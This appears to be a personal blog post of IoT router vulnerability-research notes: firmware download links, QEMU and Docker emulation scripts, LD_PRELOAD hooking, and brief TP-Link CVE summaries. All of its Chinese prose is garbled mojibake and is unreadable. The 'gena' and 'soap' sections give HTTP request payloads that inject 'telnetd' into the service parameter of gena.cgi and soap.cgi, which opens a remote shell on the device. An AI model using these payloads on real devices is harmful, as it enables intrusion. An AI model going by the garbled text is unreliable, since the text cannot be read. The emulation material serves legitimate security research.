---
title: IOT æ¼æ´æŒ–æ˜è®°å½•
date: 2023-04-24 00:28:59 +0800
categories: [ctfæ¯”èµ›]
tags: [pwn, ctf]
permalink: /posts/id=62/
pin: false
published:
---

ä¸»è¦æ˜¯åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­è®°å½•ä¸€äº›ç¬”è®°

## å›ºä»¶ä¸‹è½½

**å„å¤§å‚å•†çš„ä¸‹è½½åœ°å€**

Tenda: https://www.tenda.com.cn/download/default.html

D-Link: https://tsd.dlink.com.tw/

TP-Link: https://resource.tp-link.com.cn/?source=index

åä¸º: https://support.huawei.com/enterprise/zh/software/index.html

NETGEAR/ç½‘ä»¶: http://support.netgear.cn/

ASUS/åç¡•: https://www.asus.com.cn/support/download-center/

cisco/æ€ç§‘: https://software.cisco.com/download/home

linksys/é¢†åŠ¿: https://www.linksys.com/linksys-support

H3C: http://www.h3c.com/cn/Service/Document_Software/Software_Download/

FASTè¿…æ·: https://service.fastcom.com.cn/download-list.html

æ°´æ˜Ÿ: https://service.mercurycom.com.cn/download-list.html

OpenWrt: https://downloads.openwrt.org/

æµ·åº·å¨è§†: https://www.hikvision.com/cn/support/Downloads/Device-upgrade-package/

**å®˜ç½‘æ²¡æœ‰å›ºä»¶ä¸‹è½½é“¾æ¥**

åˆ°ç¬¬ä¸‰æ–¹ä¸‹è½½ https://drivers.mydrivers.com/s-0-0/h0-0-0-0-3-1-1.htm

å°ç±³: https://xiaomifirmwareupdater.com/ã€https://mirom.ezbox.idv.tw/en/

Cisco/æ€ç§‘: https://doc.lagout.org/network/Cisco/

## ç³»ç»Ÿé•œåƒä¸‹è½½

```Bash
armel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armel/debian_wheezy_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-3.2.0-4-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-3.2.0-4-versatile
# 2.6.32
wget https://people.debian.org/~aurel32/qemu/armel/debian_squeeze_armel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armel/initrd.img-2.6.32-5-versatile
wget https://people.debian.org/~aurel32/qemu/armel/vmlinuz-2.6.32-5-versatile

armhf:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress
wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress

mipsel:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta

mips:
# 3.2.0
wget https://people.debian.org/~aurel32/qemu/mips/debian_wheezy_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta

# 2.6.32
wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta
```

## æŒ–æ˜æŠ€å·§tipså’ŒçŸ¥è¯†ç‚¹

```sh
sudo vim /etc/ssh/sshd_config
PasswordAuthenticationæ”¹æˆyes

vsnprintf(str, 0x400u, format, va);
æŒ‰ç…§formatçš„æ ¼å¼ï¼ˆ%sï¼‰ï¼Œå°†vaä¼ å…¥str

ä¾‹å¦‚ vaæ˜¯æ ˆä¸Šåˆ—è¡¨/formatä¸º%S %S %S
+0000000C filename:.word ?
+00000010 re_addr:.word ?
+00000014 re_port:.word ?

strä¸º filename re_addr re_port

idaæŸ¥æ‰¾å­—æ®µ Alt+t

fopenå‡½æ•°çš„modeå‚æ•°æœ‰ä»¥ä¸‹å‡ ç§ï¼š
"r"ï¼šä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™æ‰“å¼€å¤±è´¥ã€‚
"w"ï¼šä»¥å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºæ–‡ä»¶å†…å®¹ã€‚
"a"ï¼šä»¥è¿½åŠ æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™åœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ å†…å®¹ã€‚
"r+"ï¼šä»¥è¯»å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚æ–‡ä»¶å¿…é¡»å­˜åœ¨ï¼Œå¦åˆ™æ‰“å¼€å¤±è´¥ã€‚
"w+"ï¼šä»¥è¯»å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™æ¸…ç©ºæ–‡ä»¶å†…å®¹ã€‚
"a+"ï¼šä»¥è¯»å†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–‡ä»¶ï¼›å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™åœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ å†…å®¹ã€‚
é™¤äº†ä»¥ä¸Šå…­ç§æ¨¡å¼å¤–ï¼Œè¿˜å¯ä»¥åœ¨æ¨¡å¼å­—ç¬¦ä¸²ä¸­æ·»åŠ "b"å­—ç¬¦ï¼Œè¡¨ç¤ºä»¥äºŒè¿›åˆ¶æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œ"rb"è¡¨ç¤ºä»¥åªè¯»æ–¹å¼æ‰“å¼€äºŒè¿›åˆ¶æ–‡ä»¶ã€‚

bashè„šæœ¬`ls`å‘½ä»¤æ‰§è¡Œ
ä½¿ç”¨ && è¿æ¥ä¸¤ä¸ªå‘½ä»¤æ—¶ï¼Œç¬¬äºŒä¸ªå‘½ä»¤åªæœ‰åœ¨ç¬¬ä¸€ä¸ªå‘½ä»¤æˆåŠŸæ‰§è¡Œï¼ˆå³è¿”å›çŠ¶æ€ç ä¸º0ï¼‰ä¹‹åæ‰ä¼šæ‰§è¡Œ

ç”¨FAPå¯åŠ¨å¥½å›ºä»¶åï¼Œéœ€è¦ç”¨echo 0 > /proc/sys/kernel/randomize_va_spaceå‘½ä»¤å…³é—­åœ°å€éšæœºåŒ–ï¼ˆASLRï¼‰

# åœ¨å½“å‰ç›®å½•æŸ¥æ‰¾
grep -r "CVE-2022-45511" ./
```



hnap

upnp

```
cgibinä¼šä½œä¸º â€œè¯·æ±‚éªŒè¯æ–‡ä»¶â€ ï¼Œå¯¹ç”¨æˆ·çš„è¯·æ±‚è¿›è¡ŒéªŒè¯å¹¶è§£æï¼Œå†å°†è§£æåçš„æ•°æ®ä¼ ç»™å¯¹åº”çš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥çš„æ“ä½œã€‚

SSDPï¼ˆç®€å•æœåŠ¡å‘ç°åè®®ï¼‰ï¼ŒSOAPï¼ˆç®€å•å¯¹è±¡è®¿é—®åè®®ï¼‰ä¸GENAï¼ˆé€šç”¨äº‹ä»¶é€šçŸ¥ä½“ç³»ï¼‰ ï¼Œå…¶åˆ†åˆ«å¯¹åº”ssdpcgiï¼ˆåœ¨/htdocs/upnpç›®å½•ä¸‹ï¼‰ï¼Œsoap.cgiï¼ˆåœ¨/htdocs/upnp/docs/LAN-1ç›®å½•ä¸‹ï¼‰ï¼Œgena.cgiï¼ˆåœ¨/htdocs/upnp/docs/LAN-1ç›®å½•ä¸‹ï¼‰


/usr/sbin/upnp ä¸­åˆ™åŒ…å«äº†è¯·æ±‚è§„åˆ™
```

SSDP

```
è°ƒç”¨ç«¯å£æŸ¥è¯¢
/var/run/httpd.conf



# ç§°ä¸ºHTTPUåè®®ï¼ˆå³åŸºäºUDPçš„HTTPï¼‰


M-SEARCH * HTTP / 1.1  
hostï¼š239.255.255.250 ï¼š1900  
MANï¼šssdpï¼šdiscover  
MXï¼š10  
STï¼šssdp:all

UUID
Universally Unique Identifierï¼Œé€šç”¨å”¯ä¸€è¯†åˆ«ç ã€‚ç›®çš„æ˜¯è®©åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œéƒ½æœ‰å”¯ä¸€è¾¨è¯†å’¨è¯¢ï¼Œå®šä¹‰æ ¼å¼ä¸ºï¼šxxxxxxxx-xxxx-xxxx-xxxxxxxxxxxxxxxx(8-4-4-16),åˆ†åˆ«ä¸ºå½“å‰æ—¥æœŸå’Œæ—¶é—´ï¼Œæ—¶é’Ÿåºåˆ—ï¼Œå…¨å±€å”¯ä¸€çš„IEEEæœºå™¨è¯†åˆ«å·ï¼Œå¦‚æœæœ‰ç½‘å¡ï¼Œä»ç½‘å¡macåœ°å€è·å¾—ï¼Œæ²¡æœ‰ç½‘å¡ä»¥å…¶ä»–æ–¹å¼è·å¾—ã€‚
UDN
å•ä¸€è®¾å¤‡åï¼ˆUnique Device Nameï¼‰ï¼ŒåŸºäºUUIDï¼Œè¡¨ç¤ºä¸€ä¸ªè®¾å¤‡ã€‚åœ¨ä¸åŒçš„æ—¶é—´ï¼Œå¯¹äºåŒä¸€ä¸ªè®¾å¤‡æ­¤å€¼åº”è¯¥æ˜¯å”¯ä¸€çš„ã€‚
URN
URLçš„ä¸€ç§æ›´æ–°å½¢å¼ï¼Œç»Ÿä¸€èµ„æºåç§°(URN,Uniform Resource Name)ã€‚å”¯ä¸€æ ‡è¯†ä¸€ä¸ªå®ä½“çš„æ ‡è¯†ç¬¦ï¼Œä½†æ˜¯ä¸èƒ½ç»™å‡ºå®ä½“çš„ä½ç½®ã€‚æ ‡è¯†æŒä¹…æ€§Internetèµ„æºã€‚URNå¯ä»¥æä¾›ä¸€ç§æœºåˆ¶ï¼Œç”¨äºæŸ¥æ‰¾å’Œæ£€ç´¢å®šä¹‰ç‰¹å®šå‘½åç©ºé—´çš„æ¶æ„æ–‡ä»¶ã€‚å°½ç®¡æ™®é€šçš„URLå¯ä»¥æä¾›ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½†æ˜¯åœ¨è¿™æ–¹é¢ï¼ŒURN æ›´åŠ å¼ºå¤§å¹¶ä¸”æ›´å®¹æ˜“ç®¡ç†ï¼Œå› ä¸º URN å¯ä»¥å¼•ç”¨å¤šä¸ª URLã€‚
Mx
1åˆ°5ä¹‹é—´çš„ä¸€ä¸ªå€¼ï¼Œè¡¨ç¤ºæœ€å¤§çš„ç­‰å¾…åº”ç­”çš„ç§’æ•°ã€‚
ST
Seatch Targerï¼Œè¡¨ç¤ºæœç´¢çš„èŠ‚ç‚¹ç±»å‹ã€‚

# åº”ç­”
HTTP/1.1 200 OK\r\n
CACHE-CONTROL: max-age=120\r\n
ST: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
USN: uuid:75802409-bccb-40e7-8e6c-40a5ef100e92\r\n
EXT:\r\n
SERVER: RT-N56U/3.4.3.9 UPnP/1.1 MiniUPnPd/2.0\r\n
LOCATION: http://192.168.100.1:24795/rootDesc.xml\r\n
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n
01-NLS: 1652586384\r\n
BOOTID.UPNP.ORG: 1652586384\r\n
CONFIGID.UPNP.ORG: 1337\r\n
\r\n
```

gena

```
SUBCRIBE

request = b"SUBSCRIBE /gena.cgi?service=" + b"`telnetd -p 7777`" + b" HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Callback: http:///\r\n"
request += b"NT: upnp:event\r\n"
request += b"Timeout: Second-2333\r\n\r\n"
service=åé¢çš„å†…å®¹ï¼Œå†å…ˆçœ‹åˆ°SUBCRIBEè¯·æ±‚æ–¹å¼å¯¹åº”çš„sub_41A390å‡½æ•°ï¼š
```



soap

```
from socket import *
from os import *
from time import *
 
request = b"POST /soap.cgi?service=&&telnetd -p 8888&& HTTP/1.1\r\n"
request += b"Host: localhost:49152\r\n"
request += b"Content-Type: text/xml\r\n"
request += b"Content-Length: 88\r\n"
request += b"SOAPAction: a#b\r\n\r\n"
```





## æ¼æ´å¤ç°è®°å½•

### Cisco

#### RV340(1.0.03.29 )

imgå›ºä»¶ï¼Œopenwrtå¼€å‘

7zipæå–ubié•œåƒï¼Œå°†å¾—åˆ°çš„ubiæ ¼å¼imgç”¨binwalkè¿›è¡Œè§£å‹

ä¾æ¬¡å¯åŠ¨nginxæœåŠ¡

```Bash
/etc/init.d/boot boot
generate_default_cert
/etc/init.d/confd start
/etc/init.d/nginx start
```

### tenda

#### w30e

ä¼¼ä¹å›ºä»¶å†…æ²¡æœ‰å®Œæ•´çš„webé¡µé¢æ–‡ä»¶ï¼Œæš‚ä¸”æç½®ğŸ˜¢



æ¼æ´ç‚¹åŠŸèƒ½ä¸€èˆ¬æ˜¯åœ¨httpd

```shell
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static bin/httpd

#qemuå¯åŠ¨httpdç¨‹åºç›®ï¼Œå¹¶å¼€å¯è°ƒè¯•ç«¯å£
sudo chroot . ./qemu-arm-static -g 1234 ./bin/httpd


#æŸ¥çœ‹å¯æ‰§è¡Œç¨‹åºéœ€è¦çš„åŠ¨æ€é“¾æ¥åº“
readelf -d ./bin/httpd | grep NEEDED
#åˆ—å‡ºæ‰€æœ‰çš„å‡½æ•°åï¼Œä¸è¦å¯»æ‰¾çš„å‡½æ•°å¯¹æ¯”
nm -D ./lib/libcommon.so

```

#### W20E(v15.11.0.6)

- qemu-arm-staticå¯ä»¥ç›´æ¥ä½¿ç”¨**, **é“¾æ¥`webroot_ro`åˆ°`/webroot`
- ç„¶åå‘ç°httpdæ— æ³•ç›‘å¬80ç«¯å£, æ˜¾ç¤ºg_lan_ip=0.
- IDAå’ŒæŸ¥çœ‹webroot_roå‘ç°default.cfgä¸­å­˜äº†g_lan_ip, ä¸ºéé›¶å€¼, GetValueå‡½æ•°è´Ÿè´£è¯»å–è¯¥æ–‡ä»¶. 
- è¿›åˆ°libcommon.so.0å‘ç°è¯¥å‡½æ•°å’Œcfmdè¿›ç¨‹é€šä¿¡è·å–çš„è¯¥æ•°å€¼, è€Œcfmdçš„å¯åŠ¨åˆéœ€è¦mtdè®¾å¤‡ç­‰ç­‰,  äºæ˜¯**è‡ªå·±å†™ä¸€ä¸ªGetValueå‡½æ•°è¿›è¡Œhook, ç›´æ¥ä½¿ç”¨æ–‡ä»¶è¯»å–**: https://pastebin.ubuntu.com/p/8tQXJHQd3h/
- æŸ¥çœ‹`/lib`ä¸‹çš„libc, å‘ç°æ˜¯uClibc, ç¼–è¯‘å‚è€ƒ[è¿™é‡Œ](https://iotsec-zone.com/article?id=202#4ã€Netgear  R8300å›ºä»¶æ¨¡æ‹Ÿï¼ˆqemu-userï¼‰):

```Bash
#compile lib.so
LD_LIBRARY_PATH=/root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib
apt install libelf-dev:i386  
ln -s /root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc /bin/ugcc
ugcc -shared -fPIC -Wall getvalue.c -o getvalue.so
#in chroot env:
./qemu-arm-static -E LD_PRELOAD=/getvalue.so /bin/httpd
```

- å‘ç°æ— æ³•ç™»é™†, ä»€ä¹ˆå¯†ç éƒ½ä¸è¡Œ. äºæ˜¯æ‰¾åˆ°ç™»é™†å‡½æ•°`authSecurityHandler`****patchè·³è¿‡å¯†ç strcmp.
- å•å‘ç°ç½‘é¡µå¡ä½äº†æ— æ³•æ˜¾ç¤ºè®¾ç½®çš„é€‰é¡¹å’ŒæŒ‰é’®,å®‰è£…gdb-multiarchè°ƒè¯•äº†ä¸‹. åœ¨ç½‘é¡µå¡ä½æ—¶ctrl+cä¸­æ–­ååˆç»§ç»­è¿è¡Œ, å°±ä¸å¡äº†, è¿˜æ˜¾ç¤º`ucloud_p_sem: syscall interrupt`, **patchäº†ucloud_p_semå‡½æ•°.**
- æŸäº›pocå°±æ˜¯åœ¨ä¹±å†™, å‘ç°åœ¨`parseFirstLine`å‡½æ•°ä¸­æœ‰URI too bigçš„2048é•¿åº¦é™åˆ¶, æŠŠä¸€äº›æ ˆæº¢å‡ºçš„é•¿åº¦æ”¹åœ¨è¿™ä¸ªé™åˆ¶ä¹‹å†…å³å¯éªŒè¯. 



### TOTOLINK

#### A7000R\NR1800X\X5000R

é€šè¿‡github Actionç¯å¢ƒçš„docker+qemu-systemç³»ç»Ÿæ¨¡å¼æ­å»ºï¼š

1.dockerä¸­å®‰è£…qemu-system-mipselï¼Œéœ€è¦æå‰å°†å›ºä»¶æ–‡ä»¶ç³»ç»Ÿä¸Šä¼ åˆ°qemuå¯åŠ¨çš„é•œåƒæ–‡ä»¶ä¸­(æœ¬åœ°ä½¿ç”¨tapèµ·qemuå°†æ–‡ä»¶ç³»ç»Ÿscpè¿‡å»ï¼Œæˆ–è€…åˆ«çš„æ–¹å¼ä¹Ÿå¯ä»¥)

2.ç¼–å†™shè„šæœ¬å®ç°qemu-system-mipselè‡ªåŠ¨ç™»å½•

3.dockerfileç¼–å†™å®‰è£…éœ€è¦çš„ä¾èµ–

shè„šæœ¬(åˆ«çš„ç³»ç»Ÿéœ€è¦ä¿®æ”¹ä¸ºå¯¹åº”ç³»ç»Ÿå)

```Bash
cd /root/
/usr/bin/expect<<EOF
set timeout 10000

spawn qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic \
    -net user,hostfwd=tcp::80-:80 -nographic

expect "debian-mipsel login:"
send "root\r"

#expect "root@debian-mipsel:~# "
#send "echo 0 > /proc/sys/kernel/randomize_va_space\r"

expect "Password:"
send "root\r"

expect "root@debian-mipsel:~# "
send "mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc\r"

expect "root@debian-mipsel:~# "
send "chroot squashfs-root/ /bin/sh\r"

expect "# "
send "ifconfig\r"

expect "# "
send "./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf\r"
expect "# "

expect eof
EOF
#cd /root/squashfs-root
#./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf
sleep infinity;
```

Dockerfile

```Bash
FROM ubuntu:16.04

RUN apt update \
    && apt install -y qemu-system-mipsel \
    && apt install -y xz-utils \
    && apt install -y net-tools \
    && apt install -y expect \
    && apt install -y bridge-utils uml-utilities openssh-server

COPY debian_wheezy_mipsel_standard.qcow2 /root/debian_wheezy_mipsel_standard.qcow2

COPY vmlinux-3.2.0-4-4kc-malta /root/vmlinux-3.2.0-4-4kc-malta

COPY start.sh /root/start.sh

CMD [ "/bin/sh", "-c", "/root/start.sh" ]
```

æ„å»ºå¥½dockeråï¼Œå°±å¯ä»¥å°†å®¹å™¨ä¸Šä¼ åˆ°è‡ªå·±çš„githubä»“åº“

ç„¶åexploit_dbä¸­ä½¿ç”¨çš„dockerfileå¯ä»¥ç›´æ¥è¿™æ ·

```Bash
FROM xxx/xxx:version
```

è¿™æ ·å°±èƒ½è§£å†³github actionä¸­è·‘dockerï¼ŒåŒæ—¶ï¼Œdockerä¸Šè¿è¡Œqemu-systemçš„å„ç§é—®é¢˜



### tp-LINK

#### TP-LINK ER5120G

CVE-2023-43138	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868nå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…åœ¨è®¤è¯åæ·»åŠ NAPTè§„åˆ™ï¼Œä¸”è§„åˆ™åç§°å¸¦æœ‰æ³¨å…¥ç‚¹ã€‚
CVE-2023-43137	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868nå­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…åœ¨è®¤è¯åæ·»åŠ ACLè§„åˆ™ï¼Œè§„åˆ™åç§°å‚æ•°å­˜åœ¨æ³¨å…¥ç‚¹ã€‚

CVE-2023-43135    TP-LINK ER5120G 4.0 2.0.0 Build 210817 Rel.80868nä¸­å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯è·å–è®¾å¤‡æ•æ„Ÿä¿¡æ¯ï¼Œè·å–ç”¨æˆ·ä»¤ç‰Œï¼Œæœ€ç»ˆç™»å½•è®¾å¤‡åå°ç®¡ç†ã€‚











## å¿«é€Ÿå¯åŠ¨

```shell
# ç”¨æˆ·çº§qemu
sudo cp $(which qemu-arm-static) .
# sudo cp $(which qemu-mipsel-static) .
# sudo chroot . ./qemu-arm-static /lib/libc.so.6
sudo chroot . ./qemu-arm-static /bin/httpd

#-------------------------------------------------------------------
# ç³»ç»Ÿçº§qemuï¼ˆæ¡¥æ¥ï¼‰
# é…ç½®æœ¬æœºç½‘å¡
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.2.1/24

# å¯åŠ¨è™šæ‹Ÿæœº
./start.sh
# qemuå†…ç½‘ç»œé…ç½®
ifconfig eth0 192.168.2.2
# ifconfig eth1 192.168.2.2
service ssh start

# ä¸Šä¼ æ–‡ä»¶ç³»ç»Ÿ-ä¸»æœº
tar czf rootfs.tar.gz ./rootfs
sudo scp ./rootfs.tar.gz root@192.168.2.2:/root/

# ä¸Šä¼ æ–‡ä»¶ç³»ç»Ÿ-qemu
tar -zxvf ./rootfs.tar.gz
chmod -R 777 ./rootfs
# chmod -R 777 ./squashfs-root

# æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿ
mount -o bind /dev ./rootfs/dev && mount -t proc /proc ./rootfs/proc
# mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc
# mount -o bind /dev ./cpio-root/dev && mount -t proc /proc ./cpio-root/proc
chroot ./rootfs sh
# chroot ./squashfs-root sh
```

```shell
# start.sh

mipsel:
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mipsel_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
mips:
qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mips_standard.qcow2 \
    -append "root=/dev/sda1 console=tty0" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet -nographic
    
armel:
qemu-system-arm \
    -M versatilepb \
    -kernel vmlinuz-3.2.0-4-versatile \
    -initrd initrd.img-3.2.0-4-versatile \
    -hda debian_wheezy_armel_standard.qcow2 \
    -append "root=/dev/sda1" -net nic \
    -net tap,ifname=tap0,script=no,downscript=no \
    -nographic

armhf:
qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \
    -initrd initrd.img-3.2.0-4-vexpress \
    -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \
    -append "root=/dev/mmcblk0p2" -net nic \ 
    -net tap,ifname=tap0,script=no,downscript=no -nographic
    
arm64:
```





## patch & hook

HOOKä¸€å…±æœ‰å››ç§æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯

+ LD_PRELOAD
+ dl_open
+ LD_LIBRARY_PATH
+ ç›´æ¥é’ˆå¯¹äºŒè¿›åˆ¶æ–‡ä»¶çš„patch

```shell
# æŸ¥çœ‹libc ä¿¡æ¯
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static /lib/libc.so.6
or
strings ./lib/libc.so.0 | grep uClibc
```

### dl_open

```
mv libnvram.so libnvram_orig.so


```



### LD_PRELOAD

```shell
# glibc/eglibcç¼–è¯‘ 
arm-linux-gnueabi-gcc -shared -fPIC hook.c -o hook.so 


# uclibc ç¼–è¯‘
cd ~/am-toolchains/brcm-arm-sdk/
export LD_LIBRARY_PATH="$PWD/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib"
# åŸºäº nvram_fake
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/nvram-faker/custom_nvram_r6250.c -o /home/ef4tless/nvram-faker/custom_nvram_r6250.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/nvram-faker/custom_nvram_r6250.o -o /home/ef4tless/nvram-faker/custom_nvram_r6250.so

# åŸºäº libnvram
./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall /home/ef4tless/libnvram/nvram.c -o /home/ef4tless/libnvram/firmadyne_nvram.o

./hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib /home/ef4tless/libnvram/firmadyne_nvram.o -o /home/ef4tless/libnvram/firmadyne_libnvram.so


# ä¸Šä¼ 
scp ./hook.so root@192.168.2.2:/root/rootfs/

scp ./mini_httpd root@192.168.2.2:/root/rootfs/usr/sbin
```



```shell
# è¿è¡Œ
LD_PRELOAD=./hook.so ./usr/sbin/mini_httpd
# æ³¨å…¥ç¯å¢ƒå˜é‡
export LD_PRELOAD=./hook.so


# qemu usr mode / straceè¿½è¸ª
sudo chroot . ./qemu-arm-static ./usr/sbin/upnpd
sudo chroot . ./qemu-arm-static -strace ./usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="./custom_nvram_r6250.so ./lib/libdl.so.0" /usr/sbin/upnpd

sudo chroot . ./qemu-arm-static -E LD_PRELOAD="/firmadyne_libnvram.so" ./usr/sbin/upnpd



# æŸ¥çœ‹å¯åŠ¨ç«¯å£
sudo lsof -i | grep qemu


# æŒ‰å­—ç¬¦ä¸²æœç´¢
cd rootfs
grep -r "mini_httpd" ./

```



## æ‰“åŒ…docker



